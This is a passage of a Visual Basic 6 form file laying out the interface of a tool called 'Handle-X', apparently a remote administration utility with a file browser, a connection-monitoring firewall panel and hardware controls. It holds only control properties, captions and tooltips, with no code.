         TabIndex        =   43
         Top             =   600
         Width           =   6000
         _ExtentX        =   10583
         _ExtentY        =   7117
         View            =   3
         LabelEdit       =   1
         Sorted          =   -1  'True
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         AllowReorder    =   -1  'True
         FullRowSelect   =   -1  'True
         GridLines       =   -1  'True
         _Version        =   393217
         Icons           =   "ImageList1"
         SmallIcons      =   "ImageList1"
         ForeColor       =   0
         BackColor       =   16777215
         BorderStyle     =   1
         Appearance      =   0
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         NumItems        =   5
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Key             =   "Name"
            Object.Tag             =   "Name"
            Text            =   "Name"
            Object.Width           =   4764
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Key             =   "Size"
            Object.Tag             =   "Size"
            Text            =   "Size"
            Object.Width           =   1765
         EndProperty
         BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   2
            Key             =   "Read Only"
            Object.Tag             =   "Read Only"
            Text            =   "R. Only"
            Object.Width           =   1412
         EndProperty
         BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   3
            Key             =   "Hidden"
            Object.Tag             =   "Hidden"
            Text            =   "Hidden"
            Object.Width           =   1325
         EndProperty
         BeginProperty ColumnHeader(5) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   4
            Key             =   "System"
            Object.Tag             =   "System"
            Text            =   "System"
            Object.Width           =   1325
         EndProperty
      End
      Begin MSComctlLib.TreeView Dirs_Explore 
         Height          =   4035
         Left            =   60
         TabIndex        =   42
         Top             =   600
         Width           =   2535
         _ExtentX        =   4471
         _ExtentY        =   7117
         _Version        =   393217
         HideSelection   =   0   'False
         Indentation     =   89
         LabelEdit       =   1
         Style           =   6
         FullRowSelect   =   -1  'True
         SingleSel       =   -1  'True
         ImageList       =   "ImageList1"
         BorderStyle     =   1
         Appearance      =   0
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin VB.Label bar 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Index           =   2
         Left            =   0
         TabIndex        =   59
         Top             =   4680
         Width           =   8620
      End
      Begin VB.Line Line1 
         BorderWidth     =   3
         Index           =   11
         X1              =   0
         X2              =   8880
         Y1              =   580
         Y2              =   580
      End
      Begin VB.Image File_Browser_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   15
         Left            =   8160
         Stretch         =   -1  'True
         ToolTipText     =   "Upload File"
         Top             =   300
         Width           =   255
      End
      Begin VB.Image File_Browser_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   14
         Left            =   7606
         Stretch         =   -1  'True
         ToolTipText     =   "Add To Download Manager"
         Top             =   300
         Width           =   255
      End
      Begin VB.Image File_Browser_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   13
         Left            =   7057
         Stretch         =   -1  'True
         ToolTipText     =   "Print File"
         Top             =   299
         Width           =   255
      End
      Begin VB.Image File_Browser_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   250
         Index           =   12
         Left            =   6513
         Stretch         =   -1  'True
         ToolTipText     =   "Append File"
         Top             =   303
         Width           =   250
      End
      Begin VB.Image File_Browser_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   250
         Index           =   11
         Left            =   5969
         Stretch         =   -1  'True
         ToolTipText     =   "CopyTo/MoveTo"
         Top             =   302
         Width           =   250
      End
      Begin VB.Image File_Browser_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   250
         Index           =   10
         Left            =   5425
         Stretch         =   -1  'True
         ToolTipText     =   "Shell  File"
         Top             =   301
         Width           =   250
      End
      Begin VB.Image File_Browser_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   250
         Index           =   9
         Left            =   4881
         Stretch         =   -1  'True
         ToolTipText     =   "Modify Attributes"
         Top             =   300
         Width           =   250
      End
      Begin VB.Image File_Browser_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   250
         Index           =   8
         Left            =   4337
         Stretch         =   -1  'True
         ToolTipText     =   "Delete File"
         Top             =   304
         Width           =   250
      End
      Begin VB.Image File_Browser_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   250
         Index           =   7
         Left            =   3793
         Stretch         =   -1  'True
         ToolTipText     =   "Rename File"
         Top             =   303
         Width           =   250
      End
      Begin VB.Image File_Browser_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   250
         Index           =   6
         Left            =   3249
         Stretch         =   -1  'True
         ToolTipText     =   "New File"
         Top             =   302
         Width           =   250
      End
      Begin VB.Image File_Browser_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   5
         Left            =   2700
         Stretch         =   -1  'True
         ToolTipText     =   "Reload Files"
         Top             =   300
         Width           =   255
      End
      Begin VB.Image File_Browser_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   4
         Left            =   2160
         Stretch         =   -1  'True
         ToolTipText     =   "Search The Directory"
         Top             =   300
         Width           =   255
      End
      Begin VB.Image File_Browser_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   250
         Index           =   3
         Left            =   1681
         Stretch         =   -1  'True
         ToolTipText     =   "Remove Directory [DelTree ...]"
         Top             =   300
         Width           =   250
      End
      Begin VB.Image File_Browser_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   250
         Index           =   2
         Left            =   1204
         Stretch         =   -1  'True
         ToolTipText     =   "Rename Directory [Ren...]"
         Top             =   300
         Width           =   250
      End
      Begin VB.Image File_Browser_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   250
         Index           =   1
         Left            =   727
         Stretch         =   -1  'True
         ToolTipText     =   "Make Directory [MD ...]"
         Top             =   300
         Width           =   250
      End
      Begin VB.Image File_Browser_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   250
         Index           =   0
         Left            =   250
         Stretch         =   -1  'True
         ToolTipText     =   "Reload Dirs Tree"
         Top             =   300
         Width           =   250
      End
      Begin VB.Label RoomTitle 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "\Handle-X\File Browser :\>_"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   2
         Left            =   0
         TabIndex        =   39
         Top             =   0
         Width           =   8655
      End
   End
   Begin VB.PictureBox room 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      ForeColor       =   &H80000008&
      Height          =   375
      Index           =   10
      Left            =   10320
      ScaleHeight     =   345
      ScaleWidth      =   345
      TabIndex        =   60
      Top             =   4800
      Visible         =   0   'False
      Width           =   375
      Begin VB.CheckBox FireWallCheck 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         Caption         =   "LISTENING's"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   3
         Left            =   4340
         TabIndex        =   192
         Top             =   4285
         Width           =   1455
      End
      Begin VB.CheckBox FireWallCheck 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         Caption         =   "System Files"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   2
         Left            =   2830
         TabIndex        =   191
         Top             =   4285
         Width           =   1335
      End
      Begin VB.CheckBox FireWallCheck 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         Caption         =   "UDP "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   1
         Left            =   1440
         TabIndex        =   188
         Top             =   4285
         Width           =   1215
      End
      Begin VB.CheckBox FireWallCheck 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         Caption         =   "TCP "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   0
         Left            =   50
         TabIndex        =   187
         Top             =   4285
         Width           =   1215
      End
      Begin MSComctlLib.ListView ConnectionsList 
         Height          =   3915
         Left            =   45
         TabIndex        =   120
         Top             =   300
         Width           =   5760
         _ExtentX        =   10160
         _ExtentY        =   6906
         View            =   3
         LabelEdit       =   1
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         AllowReorder    =   -1  'True
         FullRowSelect   =   -1  'True
         GridLines       =   -1  'True
         _Version        =   393217
         ForeColor       =   16777215
         BackColor       =   10904889
         BorderStyle     =   1
         Appearance      =   0
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         NumItems        =   7
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Key             =   "Name"
            Object.Tag             =   "Name"
            Text            =   "File Name"
            Object.Width           =   2117
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Text            =   "Type"
            Object.Width           =   882
         EndProperty
         BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   2
            Key             =   "Size"
            Object.Tag             =   "Size"
            Text            =   "State"
            Object.Width           =   1852
         EndProperty
         BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   3
            Key             =   "Read Only"
            Object.Tag             =   "Read Only"
            Text            =   "Access"
            Object.Width           =   1411
         EndProperty
         BeginProperty ColumnHeader(5) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   4
            Key             =   "Hidden"
            Object.Tag             =   "Hidden"
            Text            =   "L-Port"
            Object.Width           =   1059
         EndProperty
         BeginProperty ColumnHeader(6) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   5
            Key             =   "System"
            Object.Tag             =   "System"
            Text            =   "R-IP"
            Object.Width           =   1411
         EndProperty
         BeginProperty ColumnHeader(7) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   6
            Text            =   "R-Port"
            Object.Width           =   1059
         EndProperty
      End
      Begin MSComctlLib.ListView ApplicationList 
         Height          =   4155
         Left            =   5955
         TabIndex        =   124
         Top             =   300
         Width           =   2640
         _ExtentX        =   4657
         _ExtentY        =   7329
         View            =   3
         LabelEdit       =   1
         Sorted          =   -1  'True
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         AllowReorder    =   -1  'True
         FullRowSelect   =   -1  'True
         GridLines       =   -1  'True
         _Version        =   393217
         ForeColor       =   16777215
         BackColor       =   10904889
         BorderStyle     =   1
         Appearance      =   0
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         NumItems        =   3
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Key             =   "Name"
            Object.Tag             =   "Name"
            Text            =   "Name"
            Object.Width           =   1588
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Key             =   "Size"
            Object.Tag             =   "Size"
            Text            =   "A-Type"
            Object.Width           =   1323
         EndProperty
         BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   2
            Key             =   "Read Only"
            Object.Tag             =   "Read Only"
            Text            =   "URL"
            Object.Width           =   1676
         EndProperty
      End
      Begin VB.Label FireWallButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "&H"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   15
         Left            =   8020
         MouseIcon       =   "frm_main.frx":41104
         MousePointer    =   99  'Custom
         TabIndex        =   232
         ToolTipText     =   "Handle The Application When It Tried To Access The Network Resources(This mean try to block,end,suspend,..)"
         Top             =   4560
         Width           =   255
      End
      Begin VB.Label FireWallButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "&S"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   14
         Left            =   7725
         MouseIcon       =   "frm_main.frx":4140E
         MousePointer    =   99  'Custom
         TabIndex        =   231
         ToolTipText     =   "Suspend Application When It Tried To Access The Network Resources"
         Top             =   4560
         Width           =   255
      End
      Begin VB.Label FireWallButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "&D"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   13
         Left            =   7430
         MouseIcon       =   "frm_main.frx":41718
         MousePointer    =   99  'Custom
         TabIndex        =   230
         ToolTipText     =   "Del Application Source -File When It Tried To Access The Network Resources"
         Top             =   4560
         Width           =   255
      End
      Begin VB.Label FireWallButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "&E"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   12
         Left            =   7135
         MouseIcon       =   "frm_main.frx":41A22
         MousePointer    =   99  'Custom
         TabIndex        =   229
         ToolTipText     =   "End Application Process When It Tried To Access The Network Resources"
         Top             =   4560
         Width           =   255
      End
      Begin VB.Label FireWallButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "IP"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   7
         Left            =   5560
         MouseIcon       =   "frm_main.frx":41D2C
         MousePointer    =   99  'Custom
         TabIndex        =   215
         ToolTipText     =   "Execute X-Router To Remote IP Address"
         Top             =   4560
         Width           =   240
      End
      Begin VB.Label FireWallButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Del File"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   5
         Left            =   4595
         MouseIcon       =   "frm_main.frx":42036
         MousePointer    =   99  'Custom
         TabIndex        =   214
         ToolTipText     =   "Delete The Process"
         Top             =   4560
         Width           =   705
      End
      Begin VB.Label FireWallButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "X"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   16
         Left            =   8320
         MouseIcon       =   "frm_main.frx":42340
         MousePointer    =   99  'Custom
         TabIndex        =   213
         ToolTipText     =   "Del The Whole Application list"
         Top             =   4560
         Width           =   255
      End
      Begin VB.Label FireWallButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Resume"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   3
         Left            =   2785
         MouseIcon       =   "frm_main.frx":4264A
         MousePointer    =   99  'Custom
         TabIndex        =   189
         ToolTipText     =   "Resume The Selected Application"
         Top             =   4560
         Width           =   850
      End
      Begin VB.Label FireWallButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Suspend"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   2
         Left            =   1905
         MouseIcon       =   "frm_main.frx":42954
         MousePointer    =   99  'Custom
         TabIndex        =   186
         ToolTipText     =   "Suspend The Selected Application"
         Top             =   4560
         Width           =   850
      End
      Begin VB.Label FireWallButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "End Process"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   1
         Left            =   775
         MouseIcon       =   "frm_main.frx":42C5E
         MousePointer    =   99  'Custom
         TabIndex        =   185
         ToolTipText     =   "End The Selected Application'Process"
         Top             =   4560
         Width           =   1100
      End
      Begin VB.Label FireWallButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "?"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   6
         Left            =   5330
         MouseIcon       =   "frm_main.frx":42F68
         MousePointer    =   99  'Custom
         TabIndex        =   129
         ToolTipText     =   "File Details"
         Top             =   4560
         Width           =   200
      End
      Begin VB.Label FireWallButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "&?"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   11
         Left            =   6840
         MouseIcon       =   "frm_main.frx":43272
         MousePointer    =   99  'Custom
         TabIndex        =   128
         ToolTipText     =   "Ask For Connection When The Application Tries To Access The Network"
         Top             =   4560
         Width           =   255
      End
      Begin VB.Label FireWallButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "&B"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   10
         Left            =   6545
         MouseIcon       =   "frm_main.frx":4357C
         MousePointer    =   99  'Custom
         TabIndex        =   127
         ToolTipText     =   "Block Application To Access The Network"
         Top             =   4560
         Width           =   255
      End
      Begin VB.Label FireWallButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "&A"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   9
         Left            =   6250
         MouseIcon       =   "frm_main.frx":43886
         MousePointer    =   99  'Custom
         TabIndex        =   126
         ToolTipText     =   "Allow Application To Access The Network"
         Top             =   4560
         Width           =   255
      End
      Begin VB.Label FireWallButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "+"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   8
         Left            =   5955
         MouseIcon       =   "frm_main.frx":43B90
         MousePointer    =   99  'Custom
         TabIndex        =   125
         ToolTipText     =   "Add New Application to Application Viwer"
         Top             =   4560
         Width           =   255
      End
      Begin VB.Label FireWallButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Block All"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   4
         Left            =   3665
         MouseIcon       =   "frm_main.frx":43E9A
         MousePointer    =   99  'Custom
         TabIndex        =   123
         ToolTipText     =   "Block All Applications (As Possible)"
         Top             =   4560
         Width           =   900
      End
      Begin VB.Label FireWallButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Block"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   0
         Left            =   45
         MouseIcon       =   "frm_main.frx":441A4
         MousePointer    =   99  'Custom
         TabIndex        =   122
         ToolTipText     =   "Block Selected Connection"
         Top             =   4560
         Width           =   700
      End
      Begin VB.Label RoomTitle 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   " X-FireWall V1.0 :\>"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   7
         Left            =   0
         TabIndex        =   121
         Top             =   0
         Width           =   8655
      End
      Begin VB.Line Line2 
         BorderWidth     =   2
         Index           =   53
         X1              =   5880
         X2              =   5880
         Y1              =   4920
         Y2              =   240
      End
   End
   Begin VB.PictureBox room 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      ForeColor       =   &H80000008&
      Height          =   375
      Index           =   5
      Left            =   10320
      ScaleHeight     =   345
      ScaleWidth      =   345
      TabIndex        =   6
      Top             =   3000
      Visible         =   0   'False
      Width           =   375
      Begin VB.TextBox txt_Hardware 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00BA5925&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         IMEMode         =   3  'DISABLE
         Index           =   4
         Left            =   5040
         TabIndex        =   167
         Text            =   "0"
         Top             =   4440
         Width           =   555
      End
      Begin VB.TextBox txt_Hardware 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00BA5925&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         IMEMode         =   3  'DISABLE
         Index           =   3
         Left            =   5040
         TabIndex        =   166
         Text            =   "0"
         Top             =   3960
         Width           =   555
      End
      Begin VB.TextBox txt_Hardware 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00BA5925&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         IMEMode         =   3  'DISABLE
         Index           =   2
         Left            =   4320
         TabIndex        =   165
         Text            =   "0"
         Top             =   4440
         Width           =   555
      End
      Begin VB.TextBox txt_Hardware 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00BA5925&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         IMEMode         =   3  'DISABLE
         Index           =   1
         Left            =   4320
         TabIndex        =   164
         Text            =   "0"
         Top             =   3960
         Width           =   555
      End
      Begin VB.TextBox txt_Hardware 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00BA5925&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         IMEMode         =   3  'DISABLE
         Index           =   0
         Left            =   3870
         MaxLength       =   3
         TabIndex        =   155
         Text            =   "100"
         ToolTipText     =   "Sound Level at the remoted system"
         Top             =   2160
         Width           =   675
      End
      Begin VB.ListBox MonitorList 
         Appearance      =   0  'Flat
         BackColor       =   &H00404040&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   2010
         ItemData        =   "frm_main.frx":444AE
         Left            =   5800
         List            =   "frm_main.frx":444B0
         TabIndex        =   146
         Top             =   600
         Width           =   2780
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Cancel"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
